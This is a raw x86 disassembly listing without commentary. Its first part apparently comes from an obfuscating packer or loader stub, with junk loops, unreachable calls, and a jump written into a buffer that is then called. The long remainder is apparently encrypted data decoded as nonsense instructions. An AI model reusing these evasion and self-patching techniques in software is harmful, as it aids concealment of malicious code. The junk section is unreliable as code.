  41b8e4:	mov    eax,DWORD PTR [ebp-0x28]
  41b8e7:	xor    eax,esi
  41b8e9:	add    eax,edi
  41b8eb:	push   eax
  41b8ec:	mov    eax,DWORD PTR [ebp-0x24]
  41b8ef:	add    eax,0xaa
  41b8f4:	push   eax
  41b8f5:	mov    eax,DWORD PTR [ebp-0x24]
  41b8f8:	mov    eax,DWORD PTR [eax+0x198]
  41b8fe:	push   DWORD PTR [eax]
  41b900:	call   0x4061d0
  41b905:	mov    DWORD PTR [ebp-0x14],eax
  41b908:	mov    ecx,DWORD PTR ds:0x42846b
  41b90e:	lea    eax,[ebp+0x4]
  41b911:	mov    DWORD PTR [ecx*4+0x428463],eax
  41b918:	inc    DWORD PTR ds:0x42846b
  41b91e:	mov    eax,DWORD PTR [ebp-0x14]
  41b921:	test   eax,eax
  41b923:	je     0x41b995
  41b929:	lea    eax,[ebp-0x8]
  41b92c:	mov    DWORD PTR [ebp-0x34],eax
  41b92f:	mov    eax,DWORD PTR [ebp-0x30]
  41b932:	mov    DWORD PTR [ebp-0x8],eax
  41b935:	mov    eax,DWORD PTR [ebp-0x8]
  41b938:	mov    ecx,DWORD PTR [ebp-0x14]
  41b93b:	sub    eax,ecx
  41b93d:	mov    DWORD PTR [ebp-0x8],eax
  41b940:	mov    ecx,DWORD PTR [ebp-0x4]
  41b943:	xor    ecx,esi
  41b945:	mov    eax,0xffcd8d0a
  41b94a:	sub    eax,ecx
  41b94c:	add    DWORD PTR [ebp-0x8],eax
  41b94f:	mov    eax,DWORD PTR [ebp-0x14]
  41b952:	mov    DWORD PTR [eax],0x675565e9
  41b958:	mov    DWORD PTR [eax+0x4],0x76576787
  41b95f:	mov    eax,DWORD PTR [ebp-0x8]
  41b962:	mov    ecx,DWORD PTR [ebp-0x14]
  41b965:	push   DWORD PTR [ebp-0x24]
  41b968:	mov    DWORD PTR [ecx+0x1],eax
  41b96b:	mov    eax,ds:0x4281ef
  41b970:	push   DWORD PTR [eax]
  41b972:	push   DWORD PTR ds:0x428453
  41b978:	push   DWORD PTR ds:0x4281f7
  41b97e:	push   DWORD PTR ds:0x428433
  41b984:	push   DWORD PTR ds:0x428c1f
  41b98a:	push   DWORD PTR [ebp-0x28]
  41b98d:	push   DWORD PTR [ebp-0x2c]
  41b990:	mov    eax,DWORD PTR [ebp-0x14]
  41b993:	call   eax
  41b995:	pop    edi
  41b996:	pop    esi
  41b997:	leave  
  41b998:	ret    
  41b999:	push   ebp
  41b99a:	mov    ebp,esp
  41b99c:	sub    esp,0x34
  41b99f:	push   ebx
  41b9a0:	dec    edx
  41b9a1:	push   esi
  41b9a2:	push   edi
  41b9a3:	xor    ecx,ecx
  41b9a5:	xor    ecx,DWORD PTR ds:0x4292ff
  41b9ab:	mov    esi,DWORD PTR ds:0x429bf7
  41b9b1:	sub    esi,ecx
  41b9b3:	sub    ecx,DWORD PTR [ecx+esi*1]
  41b9b6:	mov    DWORD PTR [ebp-0x10],0xf89f85a5
  41b9bd:	lea    eax,[ebp+0x14]
  41b9c0:	and    DWORD PTR ds:0x428eb3,0x0
  41b9ca:	mov    esi,DWORD PTR ds:0x428eb3
  41b9d0:	inc    esi
  41b9d1:	mov    DWORD PTR ds:0x428eb3,esi
  41b9d7:	cmp    DWORD PTR ds:0x428eb3,0x6
  41b9de:	jg     0x41ba1e
  41b9e4:	jmp    0x41b9f7
  41b9e9:	push   0x428e6b
  41b9ee:	push   DWORD PTR [ebp-0x20]
  41b9f1:	call   DWORD PTR ds:0x42a9df
  41b9f7:	cmp    DWORD PTR ds:0x428eb3,0x5
  41b9fe:	jne    0x41ba11
  41ba04:	mov    esi,DWORD PTR ds:0x428eb3
  41ba0a:	inc    esi
  41ba0b:	mov    DWORD PTR ds:0x428eb3,esi
  41ba11:	cmp    DWORD PTR ds:0x428eb3,0x1f
  41ba18:	jb     0x41b9ca
  41ba1e:	mov    DWORD PTR [ebp-0x4],eax
  41ba21:	sbb    edx,DWORD PTR ds:0x428ec7
  41ba27:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  41ba2e:	mov    DWORD PTR ds:0x428e2f,0x1d
  41ba38:	cmp    DWORD PTR ds:0x428e2f,0x0
  41ba3f:	je     0x41ba75
  41ba45:	cmp    DWORD PTR ds:0x428e2f,0x26
  41ba4c:	jle    0x41ba75
  41ba52:	jmp    0x41ba63
  41ba57:	push   DWORD PTR [ebp-0x24]
  41ba5a:	push   DWORD PTR [ebp-0x28]
  41ba5d:	call   DWORD PTR ds:0x42a9e3
  41ba63:	mov    ecx,DWORD PTR ds:0x428e2f
  41ba69:	dec    ecx
  41ba6a:	mov    DWORD PTR ds:0x428e2f,ecx
  41ba70:	jmp    0x41ba38
  41ba75:	lea    eax,[ebp-0xc]
  41ba78:	and    DWORD PTR ds:0x428e5b,0x0
  41ba82:	jmp    0x41ba94
  41ba87:	mov    ecx,DWORD PTR ds:0x428e5b
  41ba8d:	inc    ecx
  41ba8e:	mov    DWORD PTR ds:0x428e5b,ecx
  41ba94:	cmp    DWORD PTR ds:0x428e5b,0x1d
  41ba9b:	jae    0x41bac3
  41baa1:	cmp    DWORD PTR ds:0x428e5b,0x2b
  41baa8:	jge    0x41bac3
  41baae:	jmp    0x41babe
  41bab3:	push   0x428e2f
  41bab8:	call   DWORD PTR ds:0x42a9e7
  41babe:	jmp    0x41ba87
  41bac3:	mov    DWORD PTR [ebp-0x14],eax
  41bac6:	mov    eax,DWORD PTR [ebp-0xc]
  41bac9:	mov    esi,DWORD PTR ds:0x428e33
  41bacf:	or     DWORD PTR ds:0x428e6b,esi
  41bad5:	mov    edx,DWORD PTR [ebp-0x14]
  41bad8:	and    DWORD PTR ds:0x428e77,0x0
  41bae2:	jmp    0x41baf4
  41bae7:	mov    ecx,DWORD PTR ds:0x428e77
  41baed:	inc    ecx
  41baee:	mov    DWORD PTR ds:0x428e77,ecx
  41baf4:	cmp    DWORD PTR ds:0x428e77,0x19
  41bafb:	jae    0x41bb3b
  41bb01:	cmp    DWORD PTR ds:0x428e77,0x9
  41bb08:	jle    0x41bb3b
  41bb0e:	jmp    0x41bb1c
  41bb13:	push   DWORD PTR [ebp-0x28]
  41bb16:	call   DWORD PTR ds:0x42a9eb
  41bb1c:	cmp    DWORD PTR ds:0x428e77,0x8
  41bb23:	jne    0x41bb36
  41bb29:	mov    ecx,DWORD PTR ds:0x428e77
  41bb2f:	inc    ecx
  41bb30:	mov    DWORD PTR ds:0x428e77,ecx
  41bb36:	jmp    0x41bae7
  41bb3b:	mov    ecx,0x75108af
  41bb40:	mov    esi,DWORD PTR ds:0x428e33
  41bb46:	add    DWORD PTR ds:0x428e47,esi
  41bb4c:	xor    eax,ecx
  41bb4e:	sub    DWORD PTR ds:0x428e6f,0x2684
  41bb58:	add    eax,0x3272f6
  41bb5d:	mov    DWORD PTR [edx],eax
  41bb5f:	sbb    eax,eax
  41bb61:	mov    eax,ds:0x4281eb
  41bb66:	mov    DWORD PTR ds:0x428e8b,0x1a
  41bb70:	cmp    DWORD PTR ds:0x428e8b,0x0
  41bb77:	je     0x41bbcc
  41bb7d:	cmp    DWORD PTR ds:0x428e8b,0xd
  41bb84:	jge    0x41bbcc
  41bb8a:	jmp    0x41bba0
  41bb8f:	push   DWORD PTR [ebp-0x18]
  41bb92:	push   0x428eab
  41bb97:	push   DWORD PTR [ebp-0x10]
  41bb9a:	call   DWORD PTR ds:0x42a9ef
  41bba0:	cmp    DWORD PTR ds:0x428e8b,0xe
  41bba7:	jne    0x41bbba
  41bbad:	mov    edx,DWORD PTR ds:0x428e8b
  41bbb3:	dec    edx
  41bbb4:	mov    DWORD PTR ds:0x428e8b,edx
  41bbba:	mov    edx,DWORD PTR ds:0x428e8b
  41bbc0:	dec    edx
  41bbc1:	mov    DWORD PTR ds:0x428e8b,edx
  41bbc7:	jmp    0x41bb70
  41bbcc:	mov    edx,DWORD PTR [ebp-0x4]
  41bbcf:	or     esi,0x7d03
  41bbd5:	mov    eax,DWORD PTR [eax]
  41bbd7:	mov    DWORD PTR ds:0x428ebf,0x12
  41bbe1:	cmp    DWORD PTR ds:0x428ebf,0x0
  41bbe8:	je     0x41bc1d
  41bbee:	cmp    DWORD PTR ds:0x428ebf,0x18
  41bbf5:	jl     0x41bc1d
  41bbfb:	jmp    0x41bc0b
  41bc00:	push   0x428000
  41bc05:	call   DWORD PTR ds:0x42a9bb
  41bc0b:	mov    esi,DWORD PTR ds:0x428ebf
  41bc11:	dec    esi
  41bc12:	mov    DWORD PTR ds:0x428ebf,esi
  41bc18:	jmp    0x41bbe1
  41bc1d:	add    eax,DWORD PTR [edx]
  41bc1f:	mov    DWORD PTR [ebp-0x8],eax
  41bc22:	mov    esi,DWORD PTR [ebp+0x8]
  41bc25:	mov    eax,ds:0x428373
  41bc2a:	and    DWORD PTR ds:0x428e33,0x0
  41bc34:	jmp    0x41bc46
  41bc39:	mov    edx,DWORD PTR ds:0x428e33
  41bc3f:	inc    edx
  41bc40:	mov    DWORD PTR ds:0x428e33,edx
  41bc46:	cmp    DWORD PTR ds:0x428e33,0x1c
  41bc4d:	jae    0x41bc8f
  41bc53:	cmp    DWORD PTR ds:0x428e33,0x8
  41bc5a:	jbe    0x41bc8f
  41bc60:	jmp    0x41bc70
  41bc65:	push   0x428189
  41bc6a:	call   DWORD PTR ds:0x42a9bf
  41bc70:	cmp    DWORD PTR ds:0x428e33,0x7
  41bc77:	jne    0x41bc8a
  41bc7d:	mov    edx,DWORD PTR ds:0x428e33
  41bc83:	inc    edx
  41bc84:	mov    DWORD PTR ds:0x428e33,edx
  41bc8a:	jmp    0x41bc39
  41bc8f:	mov    eax,DWORD PTR [eax+0x198]
  41bc95:	and    DWORD PTR ds:0x428eaf,0x0
  41bc9f:	mov    edx,DWORD PTR ds:0x428eaf
  41bca5:	inc    edx
  41bca6:	mov    DWORD PTR ds:0x428eaf,edx
  41bcac:	cmp    DWORD PTR ds:0x428eaf,0x19
  41bcb3:	jbe    0x41bcd6
  41bcb9:	jmp    0x41bcc9
  41bcbe:	push   0x5031
  41bcc3:	call   DWORD PTR ds:0x42a9c3
  41bcc9:	cmp    DWORD PTR ds:0x428eaf,0x10
  41bcd0:	jb     0x41bc9f
  41bcd6:	xor    esi,ecx
  41bcd8:	mov    edx,0x3272f6
  41bcdd:	add    esi,edx
  41bcdf:	mov    DWORD PTR ds:0x428e7f,0x53fd
  41bce9:	cmp    DWORD PTR [eax],esi
  41bceb:	mov    DWORD PTR ds:0x428e27,0x6856
  41bcf5:	je     0x41bd16
  41bcfb:	mov    DWORD PTR ds:0x428e6f,0x6d53
  41bd05:	mov    eax,DWORD PTR [eax]
  41bd07:	mov    DWORD PTR ds:0x428e5f,0xa8d
  41bd11:	jmp    0x420797
  41bd16:	or     DWORD PTR ds:0x428ec7,ecx
  41bd1c:	mov    eax,DWORD PTR [ebp+0x18]
  41bd1f:	mov    esi,DWORD PTR ds:0x428e47
  41bd25:	adc    esi,DWORD PTR ds:0x428eb3
  41bd2b:	mov    DWORD PTR ds:0x428e47,esi
  41bd31:	mov    esi,DWORD PTR [ebp+0x1c]
  41bd34:	add    DWORD PTR ds:0x428e7f,0x428e53
  41bd3e:	or     ebx,0xffffffff
  41bd41:	jmp    0x41e0ba
  41bd46:	scas   al,BYTE PTR es:[edi]
  41bd47:	fwait
  41bd48:	or     ah,BYTE PTR [esi+eax*1-0x1c]
  41bd4c:	mov    WORD PTR [ecx-0x36abec4b],ds
  41bd52:	lahf   
  41bd53:	xor    DWORD PTR [edi-0x7d02d8d1],0x83602783
  41bd5d:	or     DWORD PTR [edi+ecx*1],0x42
  41bd61:	data16 jbe 0x41bd7d
  41bd64:	mov    ebp,0xc1ca21f3
  41bd69:	inc    ebx
  41bd6a:	jle    0x41bd0b
  41bd6c:	mov    esi,0x324cce6
  41bd71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd72:	and    ebp,DWORD PTR [esi+0x4ade0ae6]
  41bd78:	popf   
  41bd79:	push   edx
  41bd7a:	shr    eax,0x69
  41bd7d:	sbb    al,0xd1
  41bd7f:	adc    eax,DWORD PTR [ecx-0x3e]
  41bd82:	jne    0x41bdf9
  41bd84:	or     BYTE PTR [edi-0x7e],ah
  41bd87:	push   ds
  41bd88:	dec    edi
  41bd89:	xchg   edx,eax
  41bd8a:	or     al,0x8b
  41bd8c:	aad    0x5a
  41bd8e:	mov    ds:0x49470567,eax
  41bd93:	xchg   ebp,eax
  41bd94:	fdiv   DWORD PTR [eax+edx*8+0x5aa7addb]
  41bd9b:	cdq    
  41bd9c:	rcr    eax,0x4d
  41bd9f:	xor    al,0xf6
  41bda1:	sbb    BYTE PTR [eax],bl
  41bda3:	lea    edi,[edx-0x22fe1a2c]
  41bda9:	popa   
  41bdaa:	in     al,0x17
  41bdac:	xor    DWORD PTR [edi+0x369040af],edi
  41bdb2:	lea    esi,[edi-0x5e4a2ba1]
  41bdb8:	je     0x41bd3a
  41bdba:	inc    ecx
  41bdbb:	xchg   esp,eax
  41bdbc:	test   eax,0x2df74493
  41bdc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdc2:	popf   
  41bdc3:	popf   
  41bdc4:	dec    ebp
  41bdc5:	icebp  
  41bdc6:	pop    ecx
  41bdc7:	fdivr  st(1),st
  41bdc9:	adc    BYTE PTR [ecx-0x2a],al
  41bdcc:	imul   ecx
  41bdce:	sahf   
  41bdcf:	pop    esp
  41bdd0:	or     edx,DWORD PTR [eax]
  41bdd2:	std    
  41bdd3:	or     eax,0xfb3224ea
  41bdd8:	movups XMMWORD PTR [esi+0x841f787],xmm0
  41bddf:	das    
  41bde0:	cmp    eax,DWORD PTR [ecx]
  41bde2:	inc    ecx
  41bde3:	sub    eax,0x2ae7867
  41bde8:	mov    al,0x90
  41bdea:	mov    bl,0xc7
  41bdec:	jo     0x41bd99
  41bdee:	jns    0x41bd93
  41bdf0:	(bad)  
  41bdf2:	sub    ah,BYTE PTR [edx]
  41bdf4:	out    dx,eax
  41bdf5:	cmp    DWORD PTR [eax+ecx*2],ebp
  41bdf8:	sub    al,0x37
  41bdfa:	rcl    DWORD PTR [ebp-0x20af6b88],0x13
  41be01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be02:	or     DWORD PTR ss:[edi-0x29b37af1],eax
  41be09:	cmp    BYTE PTR [edi+ebp*1],dl
  41be0c:	outs   dx,DWORD PTR ds:[esi]
  41be0d:	dec    edx
  41be0e:	jns    0x41bdd6
  41be10:	jecxz  0x41bdff
  41be12:	popf   
  41be13:	dec    edx
  41be14:	aad    0xbc
  41be16:	xchg   ebp,eax
  41be17:	call   ebx
  41be19:	cwde   
  41be1a:	jle    0x41bdb1
  41be1c:	sub    ebx,DWORD PTR [ecx]
  41be1e:	sar    BYTE PTR cs:[eax+0x35],1
  41be22:	jnp    0x41be0c
  41be24:	inc    edi
  41be25:	fisttp WORD PTR [esi+0x57]
  41be28:	pop    es
  41be29:	daa    
  41be2a:	cwde   
  41be2b:	xchg   ebp,eax
  41be2c:	push   edx
  41be2d:	mov    ah,0x72
  41be2f:	test   eax,0x259930ab
  41be34:	adc    al,ah
  41be36:	mov    bh,0x63
  41be38:	fiadd  WORD PTR [eax-0x4a]
  41be3b:	out    dx,al
  41be3c:	and    BYTE PTR [eax+ebp*2+0x4e],0x79
  41be41:	lods   eax,DWORD PTR ds:[esi]
  41be42:	or     dh,BYTE PTR [edx+0x7866ebc4]
  41be48:	mov    WORD PTR [edx],cs
  41be4a:	test   eax,0xc2f3ae38
  41be4f:	repnz iret 
  41be51:	and    al,0x2c
  41be53:	push   esi
  41be54:	push   ebx
  41be55:	sti    
  41be56:	retf   0xa911
  41be59:	mov    cl,0xfb
  41be5b:	mov    cl,0x94
  41be5d:	xchg   edx,eax
  41be5e:	scas   al,BYTE PTR es:[edi]
  41be5f:	nop
  41be60:	pushf  
  41be61:	out    dx,al
  41be62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be63:	sub    eax,0xbacc1f36
  41be68:	adc    eax,0xb972e69c
  41be6d:	ror    DWORD PTR [ebx+eiz*1-0x53cc588c],0x32
  41be75:	sub    eax,0x92ea7ca5
  41be7a:	sbb    eax,0x5284cf4a
  41be7f:	jle    0x41bef5
  41be81:	mov    eax,ds:0xff587b41
  41be86:	xchg   esi,eax
  41be87:	ins    BYTE PTR es:[edi],dx
  41be88:	add    ecx,DWORD PTR [edi+0x330aa62c]
  41be8e:	xchg   edi,eax
  41be8f:	pop    edx
  41be90:	retf   
  41be91:	inc    esp
  41be92:	popa   
  41be93:	repz and al,BYTE PTR [ecx]
  41be96:	xor    al,0x9c
  41be98:	jmp    0x6b6bde37
  41be9d:	mov    eax,0xa20216f3
  41bea2:	inc    edx
  41bea3:	(bad)  
  41bea4:	pop    esi
  41bea5:	pusha  
  41bea6:	push   ebp
  41bea7:	sahf   
  41bea8:	or     cl,BYTE PTR [ebp+edi*2-0x47]
  41beac:	(bad)  
  41bead:	repz dec esp
  41beaf:	jae    0x41be4e
  41beb1:	fwait
  41beb2:	js     0x41bebd
  41beb4:	xor    cl,BYTE PTR [ebp-0x4a5d82b4]
  41beba:	cli    
  41bebb:	icebp  
  41bebc:	test   DWORD PTR [esi-0x2a],esp
  41bebf:	fdivr  QWORD PTR [esi+0xe]
  41bec2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bec3:	cld    
  41bec4:	mov    ebx,0x839a13ee
  41bec9:	push   ecx
  41beca:	mov    bh,al
  41becc:	lds    eax,FWORD PTR [edi-0x60f015ff]
  41bed2:	adc    BYTE PTR [edi-0x1e2c60a2],al
  41bed8:	stos   DWORD PTR es:[edi],eax
  41bed9:	sbb    al,0xfa
  41bedb:	pop    ds
  41bedc:	mov    ecx,0x51450657
  41bee1:	push   ebx
  41bee2:	js     0x41bee1
  41bee4:	jg     0x41bf1c
  41bee6:	repz jno 0x41befe
  41bee9:	pop    ds
  41beea:	jmp    0x41be70
  41beec:	mov    ebx,0xbf186464
  41bef1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bef2:	iret   
  41bef3:	push   ecx
  41bef4:	xchg   BYTE PTR [esi],bl
  41bef6:	mov    ds:0x73244bd3,al
  41befb:	push   ss
  41befc:	aaa    
  41befd:	inc    ebp
  41befe:	das    
  41beff:	add    DWORD PTR [edx-0x15],esp
  41bf02:	inc    eax
  41bf03:	sub    eax,esp
  41bf05:	in     al,0x25
  41bf07:	fnstcw WORD PTR [edx+0x41]
  41bf0a:	rcl    ebx,cl
  41bf0c:	in     al,0x46
  41bf0e:	jb     0x41bf59
  41bf10:	and    DWORD PTR [esi+0x26],esp
  41bf13:	das    
  41bf14:	mov    ecx,0x41053ee8
  41bf19:	shl    BYTE PTR [ecx-0x5d80ed74],1
  41bf1f:	(bad)  
  41bf20:	lods   al,BYTE PTR ds:[esi]
  41bf21:	push   ebx
  41bf22:	pop    esi
  41bf23:	mov    edi,0x6b2042d3
  41bf28:	adc    BYTE PTR [ebp-0x37],0x69
  41bf2c:	ret    0x4cd1
  41bf2f:	jecxz  0x41bee0
  41bf31:	mov    esp,0xc9ba7d2a
  41bf36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf37:	imul   ebx,DWORD PTR [edx+0x1b],0xffffffc0
  41bf3b:	test   al,0xd4
  41bf3d:	out    dx,al
  41bf3e:	enter  0xb5c6,0xb5
  41bf42:	data16 data16 lahf 
  41bf45:	jecxz  0x41bf47
  41bf47:	rol    bh,cl
  41bf49:	xchg   esp,eax
  41bf4a:	push   ds
  41bf4b:	call   0x8c749623
  41bf50:	daa    
  41bf51:	xchg   ebx,eax
  41bf52:	lds    edi,FWORD PTR [ecx-0x30]
  41bf55:	out    dx,eax
  41bf56:	mov    BYTE PTR ds:0x8ac4798c,dh
  41bf5c:	loope  0x41bf08
  41bf5e:	ficom  DWORD PTR [ecx-0x19]
  41bf61:	or     DWORD PTR [ecx+0x7bc78213],ebx
  41bf67:	or     DWORD PTR ds:0x6ef25837,ebx
  41bf6d:	sar    DWORD PTR [edi-0x5d],0x19
  41bf71:	das    
  41bf72:	add    eax,0x47832075
  41bf77:	mov    ch,0x8a
  41bf79:	out    0x76,eax
  41bf7b:	pusha  
  41bf7c:	or     edi,0x59bab1cc
  41bf82:	bound  edx,QWORD PTR [ebx+ebx*4+0x64]
  41bf86:	std    
  41bf87:	popa   
  41bf88:	xchg   edx,eax
  41bf89:	icebp  
  41bf8a:	mov    ecx,0x781a6805
  41bf8f:	bound  edi,QWORD PTR [edx-0x619be6e7]
  41bf95:	xchg   ebp,eax
  41bf96:	(bad)  
  41bf97:	cmp    eax,0x3a2fb9fe
  41bf9c:	stos   DWORD PTR es:[edi],eax
  41bf9d:	push   ebx
  41bf9e:	mov    esp,0xa3a48c9b
  41bfa3:	fcomp  DWORD PTR ds:0x8953b896
  41bfa9:	stos   BYTE PTR es:[edi],al
  41bfaa:	aam    0x1e
  41bfac:	aas    
  41bfad:	in     eax,dx
  41bfae:	mov    WORD PTR [ebx],gs
  41bfb0:	add    eax,0xf8ab6b3c
  41bfb5:	push   es
  41bfb6:	cmp    al,0xb5
  41bfb8:	mov    eax,0xfc6ebad7
  41bfbd:	test   ah,0x6d
  41bfc0:	test   eax,0x83068021
  41bfc5:	(bad)  
  41bfc6:	inc    esi
  41bfc7:	inc    ebp
  41bfc8:	push   ebx
  41bfc9:	mov    ch,0xbe
  41bfcb:	or     al,0xd2
  41bfcd:	cwde   
  41bfce:	xor    DWORD PTR [ebx*2+0x6b6fb4e0],eax
  41bfd5:	enter  0xdd08,0x65
  41bfd9:	sbb    eax,DWORD PTR [eax]
  41bfdb:	push   ecx
  41bfdc:	dec    edi
  41bfdd:	adc    ebp,edx
  41bfdf:	pop    ds
  41bfe0:	mov    al,0x26
  41bfe2:	in     al,0x61
  41bfe4:	sub    ah,BYTE PTR [eax+ecx*1+0x3bb8bafa]
  41bfeb:	icebp  
  41bfec:	mov    al,0xd0
  41bfee:	ins    DWORD PTR es:[edi],dx
  41bfef:	add    ecx,DWORD PTR [ebx+0x3d]
  41bff2:	pop    es
  41bff3:	push   0x6b
  41bff5:	(bad)  
  41bff6:	scas   eax,DWORD PTR es:[edi]
  41bff7:	jp     0x41bfb1
  41bff9:	add    al,0xd1
  41bffb:	aad    0x9e
  41bffd:	and    al,0xc0
  41bfff:	ror    DWORD PTR [esi],1
  41c001:	dec    edx
  41c002:	or     DWORD PTR [ebx],ebp
  41c004:	mov    ?,WORD PTR [esi-0x6f]
  41c007:	xchg   ebx,eax
  41c008:	(bad)  
  41c009:	sub    BYTE PTR [ebp-0x40],cl
  41c00c:	push   eax
  41c00d:	and    BYTE PTR [edx+0x28],al
  41c010:	test   BYTE PTR [ecx-0x15],0x34
  41c014:	sbb    DWORD PTR [edx+ebx*1],eax
  41c017:	dec    ebp
  41c018:	dec    ebx
  41c019:	test   cl,dh
  41c01b:	std    
  41c01c:	or     BYTE PTR [eax-0x501688f1],al
  41c022:	dec    ebx
  41c023:	(bad)  
  41c024:	sti    
  41c025:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c026:	enter  0xe8ae,0xa0
  41c02a:	xor    al,0xe6
  41c02c:	cmp    al,0x4
  41c02e:	sbb    eax,0xc2e41947
  41c033:	jg     0x41c09d
  41c035:	fcomp  DWORD PTR [esi+0xec3f7e4]
  41c03b:	fst    st(2)
  41c03d:	jl     0x41c052
  41c03f:	icebp  
  41c040:	xlat   BYTE PTR ds:[ebx]
  41c041:	cmp    BYTE PTR [ebx],dh
  41c043:	push   ebx
  41c044:	sti    
  41c045:	and    al,0x1e
  41c047:	push   0xa1f8b355
  41c04c:	mov    ah,0x67
  41c04e:	es push edi
  41c050:	cmp    BYTE PTR [edi],bh
  41c052:	in     eax,0x99
  41c054:	or     BYTE PTR [edx+0x1ce29741],0xfa
  41c05b:	push   edi
  41c05c:	sub    DWORD PTR [esi+0x6d],edx
  41c05f:	push   ebx
  41c060:	ins    BYTE PTR es:[edi],dx
  41c061:	cmc    
  41c062:	popf   
  41c063:	in     al,0x81
  41c065:	dec    edx
  41c066:	mov    al,ds:0xc460650f
  41c06b:	into   
  41c06c:	retf   
  41c06d:	test   edi,esi
  41c06f:	mov    al,ds:0xf2215b61
  41c074:	jle    0x41c031
  41c076:	loope  0x41c092
  41c078:	in     eax,dx
  41c079:	inc    edi
  41c07a:	dec    ebp
  41c07b:	stos   BYTE PTR es:[edi],al
  41c07c:	lods   eax,DWORD PTR ds:[esi]
  41c07d:	aad    0x82
  41c07f:	sbb    DWORD PTR [edi-0x43],0x1b2c2602
  41c086:	add    al,0x8f
  41c088:	dec    eax
  41c089:	ins    BYTE PTR es:[edi],dx
  41c08a:	sbb    DWORD PTR [esi+0x0],esi
  41c08d:	aas    
  41c08e:	push   es
  41c08f:	sbb    ch,BYTE PTR [ecx-0x5ebdd1e5]
  41c095:	lds    ebx,FWORD PTR [eax-0x37]
  41c098:	mov    ah,0xa1
  41c09a:	sar    BYTE PTR [ebp+0x1dfecfef],cl
  41c0a0:	pop    edx
  41c0a1:	jmp    0x7dae90fa
  41c0a6:	bound  ebx,QWORD PTR [ecx+0x41319cd9]
  41c0ac:	cld    
  41c0ad:	push   edx
  41c0ae:	jg     0x41c0c4
  41c0b0:	mov    ebx,DWORD PTR [ebx]
  41c0b2:	cdq    
  41c0b3:	xor    al,0x76
  41c0b5:	push   cs
  41c0b6:	stos   BYTE PTR es:[edi],al
  41c0b7:	and    eax,0x43349db4
  41c0bc:	icebp  
  41c0bd:	and    eax,0xb475ed11
  41c0c2:	popa   
  41c0c3:	(bad)  
  41c0c4:	mov    esi,0x2052e815
  41c0c9:	sbb    bh,BYTE PTR [eax]
  41c0cb:	int3   
  41c0cc:	clc    
  41c0cd:	push   eax
  41c0ce:	push   cs
  41c0cf:	inc    edx
  41c0d0:	and    BYTE PTR [esi],dl
  41c0d2:	out    0xf1,eax
  41c0d4:	cmp    al,0xb6
  41c0d6:	cmp    bl,dl
  41c0d8:	out    dx,eax
  41c0d9:	rcl    DWORD PTR [ebp+0x20],1
  41c0dc:	(bad)  
  41c0dd:	out    0x9e,al
  41c0df:	aad    0x91
  41c0e1:	cli    
  41c0e2:	out    dx,al
  41c0e3:	cmc    
  41c0e4:	stc    
  41c0e5:	jl     0x41c0b7
  41c0e7:	(bad)  
  41c0e8:	pop    edx
  41c0e9:	stos   BYTE PTR es:[edi],al
  41c0ea:	mov    BYTE PTR [edx],al
  41c0ec:	xchg   edi,eax
  41c0ed:	xchg   edx,eax
  41c0ee:	push   ss
  41c0ef:	arpl   ax,bx
  41c0f1:	scas   eax,DWORD PTR es:[edi]
  41c0f2:	out    0x6,eax
  41c0f4:	push   cs
  41c0f5:	adc    BYTE PTR [eax],dl
  41c0f7:	jne    0x41c0ca
  41c0f9:	shr    BYTE PTR [edx-0x4],cl
  41c0fc:	stos   BYTE PTR es:[edi],al
  41c0fd:	jb     0x41c0bd
  41c0ff:	(bad)  
  41c100:	cmp    ecx,edi
  41c102:	push   ss
  41c103:	adc    dx,WORD PTR ds:0x2517413b
  41c10a:	push   edi
  41c10b:	nop
  41c10c:	or     cl,BYTE PTR [ebx+0x2207a2aa]
  41c112:	cmovbe edx,DWORD PTR [eax]
  41c115:	sub    ebp,DWORD PTR [eax+0x3222253d]
  41c11b:	into   
  41c11c:	cmp    al,0x19
  41c11e:	inc    edi
  41c11f:	or     edx,ebp
  41c121:	jns    0x41c0f8
  41c123:	or     esp,esp
  41c125:	cmp    BYTE PTR [ecx+0x234d65f1],bh
  41c12b:	pop    ss
  41c12c:	jmp    0xf7dd:0x40f402ab
  41c133:	cmp    bh,al
  41c135:	pop    edx
  41c136:	inc    esp
  41c137:	cli    
  41c138:	fld    TBYTE PTR [ebx+0x4]
  41c13b:	pop    edi
  41c13c:	add    BYTE PTR [edx+0x1ed98917],dh
  41c142:	push   ebp
  41c143:	pusha  
  41c144:	test   esi,eax
  41c146:	mov    DWORD PTR [ecx-0x969264f],esi
  41c14c:	adc    esi,DWORD PTR [esi+0x66]
  41c14f:	mov    al,0xef
  41c151:	adc    dh,BYTE PTR [edi+ecx*4-0x47]
  41c155:	retf   0xa038
  41c158:	ins    BYTE PTR es:[edi],dx
  41c159:	(bad)  
  41c15a:	and    bl,BYTE PTR ds:0x428db23e
  41c160:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c161:	call   0x1a1d09a9
  41c166:	mov    al,0xc5
  41c168:	jnp    0x41c154
  41c16a:	sbb    al,0x0
  41c16c:	sub    eax,0x49797585
  41c171:	js     0x41c1aa
  41c173:	(bad)  
  41c174:	jmp    0x5038c550
  41c179:	inc    DWORD PTR [ecx-0x27]
  41c17c:	xchg   ecx,eax
  41c17d:	dec    ebx
  41c17e:	push   ss
  41c17f:	dec    ebx
  41c180:	push   ds
  41c181:	push   edx
  41c182:	ins    BYTE PTR es:[edi],dx
  41c183:	pop    edi
  41c184:	fwait
  41c185:	cli    
  41c186:	push   ss
  41c187:	mov    bh,0x9d
  41c189:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c18a:	ins    DWORD PTR es:[edi],dx
  41c18b:	call   0x536c52bf
  41c190:	push   esp
  41c191:	push   0xffffffea
  41c193:	mov    dh,BYTE PTR [esi-0x5e]
  41c196:	(bad)  
  41c197:	push   esi
  41c198:	xor    ebp,DWORD PTR es:[ebx-0x58c1989f]
  41c19f:	jnp    0x41c133
  41c1a1:	pop    edi
  41c1a2:	in     al,dx
  41c1a3:	push   esp
  41c1a4:	cmp    DWORD PTR [esi+edi*2],ebp
  41c1a7:	mov    edx,0xeada1fa6
